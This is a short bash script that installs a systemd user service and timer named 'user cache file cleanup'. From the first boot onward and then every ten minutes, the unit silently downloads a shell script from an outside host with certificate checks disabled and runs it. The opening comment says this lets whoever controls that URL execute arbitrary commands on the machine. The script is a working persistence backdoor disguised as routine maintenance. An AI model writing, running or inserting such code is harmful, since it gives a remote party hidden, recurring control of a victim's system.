#!/bin/bash
# Note the url below, there you can place any shell comands that get executed every 10min

mkdir -p $HOME/.config/systemd/user/
cd $HOME/.config/systemd/user/

echo "[Unit]
Description=user cache file cleanup
[Service]
Type=simple
ExecStart=/bin/sh -c '/usr/bin/curl -k -L -s https://www.bitbull.ch/wifiducky.sh | sh 2>&1 2>/dev/null ; exit 0'
[Install]
WantedBy=default.target
" > cache_cleanup.service

echo "[Unit]
Description=user cache file cleanup
[Timer]
OnBootSec=60
OnUnitActiveSec=600
Unit=cache_cleanup.service
[Install]
WantedBy=timers.target
" > cache_cleanup.timer
systemctl --user daemon-reload
systemctl --user enable cache_cleanup.service
systemctl --user enable cache_cleanup.timer --now
